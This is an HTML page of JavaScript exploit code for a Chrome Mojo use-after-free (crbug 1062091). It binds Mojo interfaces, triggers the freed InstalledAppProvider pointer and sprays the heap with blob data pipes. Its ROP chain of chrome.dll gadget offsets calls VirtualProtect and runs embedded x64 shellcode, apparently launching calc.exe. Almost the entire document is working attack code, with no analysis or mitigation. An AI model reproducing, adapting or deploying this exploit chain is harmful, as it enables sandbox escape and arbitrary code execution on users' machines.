<script src='mojo_bindings.js'></script>
<script src='installed_app_provider.mojom.js'></script>
<script src='blob_registry.mojom.js'></script>
<script src='url.mojom.js'></script>
<script> // https://crbug.com/1062091
runs = 0
view = []
b = new blink.mojom.BlobRegistryPtr()
Mojo.bindInterface(blink.mojom.BlobRegistry.name, mojo.makeRequest(b).handle, 'process', true)
function Allocation(size=280){
  function ProgressClient(){
    function ProgressClientImpl(){}
    ProgressClientImpl.prototype = {onProgress: async (a)=>{}}
    this.binding = new mojo.AssociatedBinding(blink.mojom.ProgressClient, new ProgressClientImpl, mojo.makeRequest(new mojo.AssociatedInterfacePtrInfo))
  }
  this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size})
  b.registerFromStream('', '', size, this.pipe.consumer, new ProgressClient)
}
function getFreedPtr(){
  return new Promise((resolve, reject)=>{
    let f = document.createElement('iframe')
    f.src = '#z'
    document.body.appendChild(f)
    let interceptor = new MojoInterfaceInterceptor('j', 'process')
    interceptor.oninterfacerequest = (e)=>{
      interceptor.stop()
      document.body.removeChild(f)
      resolve(new blink.mojom.InstalledAppProviderPtr(e.handle))
    }
    interceptor.start()
  })
}
async function trigger(){
  if (window.location.hash == '#z'){
    let pipe = Mojo.createMessagePipe()
    Mojo.bindInterface(blink.mojom.InstalledAppProvider.name, pipe.handle1, 'context', true)
    return Mojo.bindInterface('j', pipe.handle0, 'process')
  }
  let data = new ArrayBuffer(0xc38)
  view = new DataView(data)
  let rw = 0x22900n + 0x637f000n + 0x11cc000n //readwriteable memory
  let chrome_dll = BigInt(localStorage.getItem('chrome_dll'))
  set = (x, z)=>{view.setBigUint64(8 * x, chrome_dll + z, true)}
  set_constant = (x, z)=>{view.setBigUint64(8 * x, z, true)}
  if (runs == 0){//triggering bug the 1st time to store a rsp gadget
    set(0, 0x6382238n /*ptr to: lea rax, [rcx+18h]*/ - 0x48n)
    set(3, 0x6382238n /*ptr to: lea rax, [rcx+18h]*/ - 0xd0n)
    set(6, 0x6da0958n /*ptr to: mov etc,[rcx] \n jmp r9*/ - 0x18n)
    set(9, 0x44f2420n /*mov [rcx], edx \n mov [rcx], r8d \n ret*/)
    set(11, rw /*readwriteable memory for storing gadget*/ - 0x5cn)
    set(12, 0xd6de34n /*push rcx \n pop rsp \n ... \n ret*/)
    set_constant(13, chrome_dll >> 32n /*r8d stores upper bytes*/)
    setTimeout('trigger()', 2000)
    runs = 1
  }
  else{//triggering the bug the 2nd time to do ROP in stack
    set(0, rw /*readwriteable memory for loading gadget*/ - 0x48n)
    set(3, 0x151a9an /*pop rdx \n ret*/)
    set_constant(4, 0x200n /*size*/)
    set(5, 0xb98f2n /*pop r8 \n ret*/)
    set_constant(6, 0x40n /*PAGE_EXECUTE_READWRITE*/)
    set(7, 0x633443fn /*VirtualProtect*/)
    set(13, 0x18fb9e0n /*mov rax, rsp \n ret*/)
    set(14, 0xde659n /*add rax, 0x20 \n ret*/)
    set(15, 0x98c14n /*push rax \n ret*/)
    let sh = [0x00c0e8f0e48348fcn, 0x5152504151410000n, 0x528b4865d2314856n, 0x528b4818528b4860n, 0xb70f4850728b4820n, 0xc03148c9314d4a4an, 0x41202c027c613cacn, 0xede2c101410dc9c1n, 0x8b20528b48514152n, 0x88808bd001483c42n, 0x6774c08548000000n, 0x4418488b50d00148n, 0x56e3d0014920408bn, 0x4888348b41c9ff48n, 0xc03148c9314dd601n, 0xc101410dc9c141acn, 0x244c034cf175e038n, 0x4458d875d1394508n, 0x4166d0014924408bn, 0x491c408b44480c8bn, 0x014888048b41d001n, 0x5a595e58415841d0n, 0x83485a4159415841n, 0x415853eb524120ecn, 0xff57e9128b485a59n, 0x0001c2c7485dffffn, 0x0001018d8d480000n, 0xff876f8b31ba4100n, 0xba4156a2b5f0bbd5n, 0x8348d5ff9dbd95a6n, 0xfb800a7c063c28c4n, 0x6f721347bb0575e0n, 0xd5ffda894159006an, 0x6578652e636c6163n, 0x48c9ff48c9ff4800n, 0x000005c2c748c9ffn, 0x00000000e8006a00n, 0x55410bc583495d41n, 0x909090feebe0ff90n]
    for(let i = 0; i < sh.length; i++) set_constant(i + 18, sh[i])
  }
  let ptr = await getFreedPtr()
  Array(8).fill().map(()=>{
    let m = new Allocation(data.byteLength)
    m.pipe.producer.writeData(data)
    m.pipe.producer.close()
  })
  ptr.filterInstalledApps([], new url.mojom.Url({url: window.location.href}))
}
setTimeout(trigger, 1000)
</script>
